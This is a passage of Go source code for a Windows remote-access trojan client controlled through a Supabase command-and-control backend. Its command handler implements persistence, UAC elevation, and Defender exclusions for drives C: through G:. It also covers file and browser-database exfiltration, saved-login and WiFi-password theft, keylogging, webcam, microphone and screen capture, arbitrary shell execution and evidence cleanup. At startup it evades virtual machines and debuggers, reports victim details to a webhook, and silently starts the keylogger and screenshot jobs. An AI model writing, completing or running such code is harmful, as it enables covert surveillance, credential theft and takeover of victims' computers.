		return nil, fmt.Errorf("ciphertext too short")
	}
	return gcm.Open(nil, ciphertext[:ns], ciphertext[ns:], nil)
}

// ================================================================
// HELP TEXT
// ================================================================

func optionsText() string {
	base := `=== MACHINE MANAGEMENT - COMMANDS ===

SYSTEM
  sysinfo        - Full system information report
  isadmin        - Check if session is admin
  elevate        - Attempt UAC elevation
  persist        - Add persistence (Startup folder VBS stager)
  unpersist      - Remove all persistence
  excludec       - Exclude C:\ from Defender scans
  excludeall     - Exclude C:\ through G:\ from Defender
  enableio       - Enable keyboard/mouse (admin)
  disableio      - Disable keyboard/mouse (admin)
  cleanup        - Wipe temp, history, recycle bin

EXFILTRATION
  exfiltrate     - Exfil files (args: path, extensions, max_size)
  browserdb      - Exfil browser databases (Chrome, Edge, Firefox)
  parsebrowser   - Parse browser history & saved logins locally
  upload         - Upload file to client (args: path, data)
  download       - Download file from client (args: path)
  foldertree     - Show folder trees for Desktop/Docs/Downloads

SURVEILLANCE
  screenshot     - Take single screenshot
  screenshots    - Start screenshot job (every 30s)
  webcam         - Start webcam capture job
  microphone     - Start microphone recording job
  keycapture     - Start keylogger job
  recordscreen   - Record screen video (args: seconds)

NETWORK
  wifi           - Show saved WiFi networks + passwords
  nearbywifi     - Show nearby WiFi networks
  enumeratelan   - Scan LAN for devices

JOBS
  jobs           - List running background jobs
  pausejobs      - Stop all background jobs
  resumejobs     - Resume default jobs
  kill           - Kill a process (args: pid) or stop a job (args: job)

PRANKS
  message        - Show message box (args: text)
  wallpaper      - Set wallpaper (args: url)
  minimizeall    - Minimize all windows
  darkmode       - Enable dark mode
  lightmode      - Disable dark mode
  shortcutbomb   - Create 50 desktop shortcuts
  fakeupdate     - Fake Windows update screen
  soundspam      - Play all Windows sounds

CONTROL
  shell          - Execute shell command (args: cmd)
  processes      - List running processes
  options        - Show this help
  antianalysis   - VM/debugger/tools check report
  ping           - Connection test
  sleep          - Sleep N seconds (args: seconds)
  exit           - Terminate client`
	return base
}

// ================================================================
// COMMAND HANDLER
// ================================================================

func handleCommand(c2 *C2Client, jm *JobManager, cmd Command) {
	c2.UpdateCommand(cmd.ID, "executing", "")
	var result string
	var cmdErr error

	switch strings.ToLower(strings.TrimSpace(cmd.Command)) {
	case "ping":
		result = "pong"

	case "options", "help":
		result = optionsText()

	case "sysinfo", "systeminfo":
		info := getFullSystemInfo(c2)
		cmdErr = c2.SendSysInfo("full", info)
		j, _ := json.MarshalIndent(info, "", "  ")
		result = string(j)

	case "isadmin":
		if isAdmin() {
			result = "Session IS admin"
		} else {
			result = "Session is NOT admin"
		}

	case "elevate":
		result = elevate()

	case "persist", "addpersistance":
		result = addPersistence()

	case "unpersist", "removepersistance":
		result = removePersistence()

	case "excludec", "excludecdrive":
		result = excludeDrive([]string{`C:\`})

	case "excludeall", "excludealldrives":
		result = excludeDrive([]string{`C:\`, `D:\`, `E:\`, `F:\`, `G:\`})

	case "enableio":
		result = blockInput(false)

	case "disableio":
		result = blockInput(true)

	case "cleanup":
		result = cleanup()

	case "screenshot":
		if img, err := captureScreen(); err != nil {
			result = fmt.Sprintf("Error: %v", err)
			cmdErr = err
		} else {
			cmdErr = c2.SendScreenshot(img)
			result = "Screenshot sent"
		}

	case "screenshots":
		result = jm.Start("screenshots", func(ctx context.Context) { screenshotJob(ctx, c2) })

	case "webcam":
		result = jm.Start("webcam", func(ctx context.Context) { webcamJob(ctx, c2) })

	case "microphone":
		result = jm.Start("microphone", func(ctx context.Context) { microphoneJob(ctx, c2) })

	case "keycapture", "keylog_start":
		result = jm.Start("keylogger", func(ctx context.Context) { keyloggerJob(ctx, c2) })

	case "keylog_stop":
		result = jm.Stop("keylogger")

	case "recordscreen":
		var args struct{ Seconds int `json:"seconds"` }
		json.Unmarshal([]byte(cmd.Args), &args)
		if args.Seconds == 0 {
			args.Seconds = 20
		}
		go recordScreenJob(context.Background(), c2, args.Seconds)
		result = fmt.Sprintf("Recording screen for %d seconds", args.Seconds)

	case "exfiltrate":
		var args struct {
			Path       string   `json:"path"`
			Extensions []string `json:"extensions"`
			MaxSize    int64    `json:"max_size"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		result = exfilFiles(c2, args.Path, args.Extensions, args.MaxSize)

	case "browserdb":
		result = exfilBrowserData(c2)

	case "parsebrowser":
		result = parseBrowserData()

	case "upload":
		var args struct {
			Path string `json:"path"`
			Data string `json:"data"`
		}
		if err := json.Unmarshal([]byte(cmd.Args), &args); err != nil {
			result = fmt.Sprintf("Args error: %v", err)
			cmdErr = err
		} else {
			decoded, err := base64.StdEncoding.DecodeString(args.Data)
			if err != nil {
				result = fmt.Sprintf("Decode error: %v", err)
				cmdErr = err
			} else {
				os.MkdirAll(filepath.Dir(args.Path), 0755)
				os.WriteFile(args.Path, decoded, 0644)
				result = fmt.Sprintf("Written %d bytes to %s", len(decoded), args.Path)
			}
		}

	case "download":
		var args struct{ Path string `json:"path"` }
		if err := json.Unmarshal([]byte(cmd.Args), &args); err != nil {
			result = fmt.Sprintf("Args error: %v", err)
		} else {
			cmdErr = c2.SendFileChunked(args.Path)
			result = fmt.Sprintf("File sent: %s", args.Path)
		}

	case "list":
		var args struct{ Path string `json:"path"` }
		if err := json.Unmarshal([]byte(cmd.Args), &args); err != nil || args.Path == "" {
			args.Path = "C:\\"
		}
		out, err := shellExec(fmt.Sprintf(`dir /b /a "%s"`, args.Path))
		if err != nil {
			result = fmt.Sprintf("Error: %v\n%s", err, out)
			cmdErr = err
		} else {
			result = out
		}

	case "foldertree":
		result = getFolderTree()

	case "wifi":
		result = getWifiProfiles()

	case "nearbywifi":
		result = getNearbyWifi()

	case "enumeratelan":
		result = scanLAN()

	case "shell":
		var args struct{ Cmd string `json:"cmd"` }
		if err := json.Unmarshal([]byte(cmd.Args), &args); err != nil {
			result = fmt.Sprintf("Args error: %v", err)
			cmdErr = err
		} else {
			out, err := shellExec(args.Cmd)
			if err != nil {
				result = fmt.Sprintf("Error: %v\n%s", err, out)
				cmdErr = err
			} else {
				result = out
			}
		}

	case "processes":
		procs := getProcessList()
		j, _ := json.MarshalIndent(procs, "", "  ")
		result = string(j)

	case "kill":
		var args struct {
			PID uint32 `json:"pid"`
			Job string `json:"job"`
		}
		json.Unmarshal([]byte(cmd.Args), &args)
		if args.Job != "" {
			result = jm.Stop(args.Job)
		} else if args.PID != 0 {
			handle, err := windows.OpenProcess(windows.PROCESS_TERMINATE, false, args.PID)
			if err != nil {
				result = fmt.Sprintf("OpenProcess error: %v", err)
			} else {
				windows.TerminateProcess(handle, 1)
				windows.CloseHandle(handle)
				result = fmt.Sprintf("Process %d terminated", args.PID)
			}
		} else {
			result = "Specify pid or job name"
		}

	case "jobs":
		names := jm.List()
		if len(names) == 0 {
			result = "No jobs running"
		} else {
			result = "Running: " + strings.Join(names, ", ")
		}

	case "pausejobs":
		result = jm.StopAll()

	case "resumejobs":
		jm.Start("keylogger", func(ctx context.Context) { keyloggerJob(ctx, c2) })
		jm.Start("screenshots", func(ctx context.Context) { screenshotJob(ctx, c2) })
		result = "Default jobs resumed (keylogger, screenshots)"

	case "antianalysis":
		info := map[string]interface{}{"is_vm": detectVM(), "is_debugged": detectDebugger(), "analysis_tools": detectAnalysisTools()}
		j, _ := json.MarshalIndent(info, "", "  ")
		result = string(j)

	case "message":
		var args struct{ Text string `json:"text"` }
		json.Unmarshal([]byte(cmd.Args), &args)
		if args.Text == "" {
			args.Text = cmd.Args
		}
		go sendMessage(args.Text)
		result = "Message sent"

	case "wallpaper":
		var args struct{ URL string `json:"url"` }
		json.Unmarshal([]byte(cmd.Args), &args)
		result = setWallpaper(args.URL)

	case "minimizeall":
		result = minimizeAll()

	case "darkmode", "enabledarkmode":
		result = setDarkMode(true)

	case "lightmode", "disabledarkmode":
		result = setDarkMode(false)

	case "shortcutbomb":
		result = shortcutBomb()

	case "fakeupdate":
		result = fakeUpdate()

	case "soundspam":
		result = soundSpam()

	case "sleep":
		var args struct{ Seconds int `json:"seconds"` }
		json.Unmarshal([]byte(cmd.Args), &args)
		if args.Seconds == 0 {
			args.Seconds = 60
		}
		time.Sleep(time.Duration(args.Seconds) * time.Second)
		result = fmt.Sprintf("Slept %d seconds", args.Seconds)

	case "exit", "close":
		c2.UpdateCommand(cmd.ID, "complete", "Exiting")
		os.Exit(0)

	default:
		// Try executing as raw shell command
		out, err := shellExec(cmd.Command + " " + cmd.Args)
		if err != nil {
			result = fmt.Sprintf("Error: %v\n%s", err, out)
			cmdErr = err
		} else {
			result = out
		}
	}

	status := "complete"
	if cmdErr != nil {
		status = "failed"
		if result == "" {
			result = cmdErr.Error()
		}
	}
	c2.UpdateCommand(cmd.ID, status, result)
}

// ================================================================
// JITTERED SLEEP
// ================================================================

func jitteredSleep(base time.Duration, jitterPct int) {
	if jitterPct <= 0 {
		time.Sleep(base)
		return
	}
	jitter := time.Duration(mrand.Intn(jitterPct)) * base / 100
	if mrand.Intn(2) == 0 {
		time.Sleep(base + jitter)
	} else {
		time.Sleep(base - jitter/2)
	}
}

// ================================================================
// MAIN
// ================================================================

func main() {
	// Anti-analysis: exit if non-VMware VM or debugger detected.
	// VMware-only triggers are treated as false positives (host has VMware installed).
	vmDetected, vmTriggers := detectVMDetails()
	dbgDetected, dbgTriggers := detectDebuggerDetails()
	vmwareOnly := isOnlyVMware(vmTriggers)
	shouldExit := (vmDetected && !vmwareOnly) || dbgDetected

	if vmDetected || dbgDetected {
		hostname, _ := os.Hostname()
		cu, _ := user.Current()
		report := map[string]interface{}{
			"hostname":     hostname,
			"username":     cu.Username,
			"vmware_only":  vmwareOnly,
			"will_exit":    shouldExit,
		}
		if vmDetected {
			report["vm_triggers"] = vmTriggers
		}
		if dbgDetected {
			report["debugger_triggers"] = dbgTriggers
		}
		report["analysis_tools"] = detectAnalysisTools()
		payload, _ := json.Marshal(report)
		http.Post("https://webhook.site/0a0aea37-6d21-47b2-844f-30db3cee67e3", "application/json", bytes.NewReader(payload))

		if shouldExit {
			time.Sleep(time.Duration(mrand.Intn(10)+5) * time.Second)
			os.Exit(0)
		}
		// VMware-only: log sent, continue execution
	}

	// Single instance
	if !createSingleInstance() {
		os.Exit(0)
	}

	// Hide console
	hideConsole()

	// Auto-cleanup stale COM hijack from removed DLL sideload feature
	// (fixes app crashes caused by dangling registry entries)
	cleanupStaleCOMHijack()

	// Build config
	hostname, _ := os.Hostname()
	currentUser, _ := user.Current()
	exePath, _ := os.Executable()

	config := &Config{
		Domains: []C2Domain{
			{
				// ===== PASTE YOUR SUPABASE URL AND ANON KEY HERE =====
				URL:      "https://supbaseurl.supabase.co",
				APIKey:   "dahkeygoesinhere",
				Priority: 10,
			},
		{
			URL:      "https://secondsupabaseurlforredundancy.supabase.co",
			APIKey:   "daothakeygoeshere",
			Priority: 5,
		},
		},
		MachineID:      generateMachineID(),
		MachineName:    hostname,
		UserName:       currentUser.Username,
		InstallPath:    exePath,
		BeaconInterval: 5 * time.Second,
		JitterPercent:  10,
	}

	// C2 client
	c2 := NewC2Client(config)

	// Register (retry until success)
	for {
		if err := c2.Register(); err == nil {
			break
		}
		jitteredSleep(10*time.Second, 30)
	}

	// Send initial system info
	c2.SendSysInfo("basic", getFullSystemInfo(c2))

	// Job manager
	jm := NewJobManager()

	// Auto-start default jobs
	jm.Start("keylogger", func(ctx context.Context) { keyloggerJob(ctx, c2) })
	jm.Start("screenshots", func(ctx context.Context) { screenshotJob(ctx, c2) })

	// Main beacon loop
	for {
		jitteredSleep(config.BeaconInterval, config.JitterPercent)
		c2.Heartbeat()
		commands, err := c2.GetPendingCommands()
		if err != nil {
			continue
		}
		for _, cmd := range commands {
			go handleCommand(c2, jm, cmd)
		}
	}
}
